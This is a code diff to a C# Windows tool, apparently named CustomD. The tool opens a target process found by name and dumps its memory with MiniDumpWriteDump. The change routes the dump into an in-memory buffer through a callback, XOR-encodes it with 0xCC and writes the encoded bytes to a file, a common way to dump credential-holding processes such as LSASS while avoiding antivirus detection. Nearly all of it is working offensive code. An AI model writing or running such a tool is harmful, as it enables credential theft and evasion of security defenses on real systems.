@@ -2,14 +2,19 @@
 using System.IO;
 using System.Text;
 using System.Security.Principal;
+using System.Runtime.InteropServices;
 using static CustomD.Configuration;
 using static CustomD.HelperFunctions;
 using static CustomD.Win32;
+
 
 namespace CustomD
 {
     public class Program
     {
+        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
+        public static int bufferSize = 0;
+
         // Get process by name using NtGetNextProcess and GetProcessImageFileName
         public static int GetByName(string proc_name) {
             // Resolve functions from delegates
@@ -45,6 +50,47 @@ namespace CustomD
                 }
             }
             return 0;
+        }
+
+        
+        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
+        {
+            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
+            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);
+            
+            // IoStartCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback) {
+                // Set S_FALSE in output
+                callbackOutput.status = 0x1;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+
+            // IoWriteAllCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
+            {
+                // Copy buffer
+                Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
+                bufferSize += callbackInput.Io.BufferBytes;
+                // Set S_OK in output
+                callbackOutput.status = 0;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+
+            // IoWriteAllCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
+            {
+                // Set S_OK in output
+                callbackOutput.status = 0;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+            return true;
+        }
+
+
+        static void EncodeBuffer(byte[] dumpBuffer, int bufferSize, byte xor_byte) {
+            for (int i = 0; i < bufferSize; i++) {
+                dumpBuffer[i] = (byte) (dumpBuffer[i] ^ xor_byte);
+            }
         }
 
 
@@ -86,20 +132,47 @@ namespace CustomD
                 filename = args[0];
             }
 
-            // Create output file
-            FileStream output_file = new FileStream(filename, FileMode.Create);
-
             // Open handle to the process
             IntPtr processHandle = auxOpenProcess(PROCESS_VM_READ| PROCESS_QUERY_INFORMATION, false, processPID);
-
+            
             if (processHandle != INVALID_HANDLE_VALUE)
             {
                 Console.WriteLine("[+] Handle to process created correctly.");
-                Console.WriteLine(" [+] Process handle: \t\t{0}", processHandle);
-                Console.WriteLine(" [+] Process PID: \t\t{0}", processPID);
+                Console.WriteLine("[+] Process handle: \t\t{0}", processHandle);
+                Console.WriteLine("[+] Process PID: \t\t{0}", processPID);
 
-                // Dump the process            
-                bool isRead = auxMiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                // Dump the process
+                CallBack MyCallBack = new CallBack(CallBackFunction);
+                MINIDUMP_CALLBACK_INFORMATION mci;
+                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
+                mci.CallbackParam = IntPtr.Zero;
+                IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
+                Marshal.StructureToPtr(mci, mci_pointer, true);
+                bool isRead = auxMiniDumpWriteDump(processHandle, processPID, IntPtr.Zero, 2, IntPtr.Zero, IntPtr.Zero, mci_pointer);
+                Marshal.FreeHGlobal(mci_pointer);
+
+                // Information about dump in memory 
+                GCHandle pinnedArray = GCHandle.Alloc(dumpBuffer, GCHandleType.Pinned);
+                IntPtr dumpBuffer_pointer = pinnedArray.AddrOfPinnedObject();
+                Console.WriteLine("[+] Dump address: \t\t0x" + dumpBuffer_pointer.ToString("X"));
+                Console.WriteLine("[+] Dump size: \t\t\t" + bufferSize + " bytes");
+                pinnedArray.Free();
+
+                // Encode buffer
+                byte xor_byte = (byte)0xCC;
+                EncodeBuffer(dumpBuffer, bufferSize, xor_byte);
+
+                // Dump to file
+                string fname = filename;
+                const uint GENERIC_ALL = 0x10000000;
+                const uint FILE_SHARE_WRITE = 0x00000002;
+                const uint CREATE_ALWAYS = 2;
+                const uint FILE_ATTRIBUTE_NORMAL = 128;
+                IntPtr hFile = CreateFileA(fname, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                WriteFile(hFile, dumpBuffer, (uint)bufferSize, out _, IntPtr.Zero);
+
+                // FileStream output_file = new FileStream(filename, FileMode.Create);
+                // bool isRead2 = auxMiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                 if (isRead)
                 {
                     Console.WriteLine("[+] Successfully dumped. File " + filename);
